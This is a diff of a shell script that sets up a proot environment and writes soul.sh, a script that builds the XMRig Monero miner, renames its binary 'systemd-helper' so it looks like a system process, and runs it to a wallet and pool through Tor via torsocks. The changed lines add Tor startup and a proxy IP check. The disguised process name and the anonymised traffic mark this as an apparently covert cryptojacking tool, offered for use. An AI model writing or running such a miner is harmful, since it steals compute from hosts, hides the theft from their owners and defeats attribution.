@@ -1,3 +1,4 @@
+
 #!/bin/sh
 
 ROOTFS_DIR=$(pwd)
@@ -77,7 +78,7 @@ $ROOTFS_DIR/usr/local/bin/proot \
   -0 -w "/root" -b /dev -b /sys -b /proc -b /etc/resolv.conf --kill-on-exit /bin/bash << 'EOF'
 
 # Update and install packages
-apt update && apt install -y sudo nano tor curl wget
+apt update && apt install -y sudo nano curl wget
 
 # Fix /etc/hosts to include hostname
 domain=$(hostname)
@@ -86,22 +87,6 @@ if grep -q "127.0.1.1" /etc/hosts; then
 else
   echo "127.0.1.1   $domain" >> /etc/hosts
 fi
-
-# Remove 'User debian-tor' from tor-service-defaults-torrc
-TOR_DEFAULTS="/usr/share/tor/tor-service-defaults-torrc"
-if grep -q "^User debian-tor" "$TOR_DEFAULTS"; then
-  sed -i '/^User debian-tor/d' "$TOR_DEFAULTS"
-fi
-
-# Configure Tor
-echo -e "SocksPort 9050\nLog notice file /var/log/tor/notices.log" >> /etc/tor/torrc
-
-# Start Tor
-sudo service tor start
-
-# Wait and check Tor
-sleep 3
-pgrep tor && echo "[✓] Tor is running!" || echo "[✗] Tor failed to start."
 
 # Create soul.sh miner script
 cat << 'EOM' > /root/soul.sh
@@ -113,7 +98,20 @@ WORKER="king3"
 echo "[+] Starting setup..."
 
 install_dependencies() {
-    sudo apt update -y && sudo apt install curl -y
+    apt update -y
+    apt install curl torsocks tor -y
+}
+
+start_tor() {
+    mkdir -p ~/.tor
+    echo "[+] Starting Tor..."
+    tor & sleep 10
+}
+
+test_tor() {
+    echo "[+] Checking Tor proxy IP..."
+    curl --socks5 127.0.0.1:9050 https://ifconfig.me
+    echo ""
 }
 
 build_xmrig() {
@@ -122,21 +120,24 @@ build_xmrig() {
     mv xmrig-6.21.0 xmrig
     cd xmrig
     mv xmrig systemd-helper
-    rm -rf xmrig
+    rm -rf xmrig.tar.gz
 }
 
 start_mining() {
     chmod +x ./systemd-helper
-#    mkdir -p /root/.tor && tor & && torsocks ./systemd-helper -o $POOL -u $WALLET -p $WORKER -k --coin monero --donate-level=1
-     mkdir -p /root/.tor && tor & sleep 5 && torsocks ./systemd-helper -o "$POOL" -u "$WALLET" -p "$WORKER" -k --coin monero --donate-level=1
-
+    torsocks ./systemd-helper -o $POOL -u $WALLET -p $WORKER -k --coin monero --donate-level=1
 }
 
-if [ ! -f "./systemd-helper" ]; then
+# MAIN EXECUTION
+if [ ! -f "./xmrig/systemd-helper" ]; then
     install_dependencies
     build_xmrig
 fi
 
+start_tor
+test_tor
+
+cd xmrig
 start_mining
 EOM
 
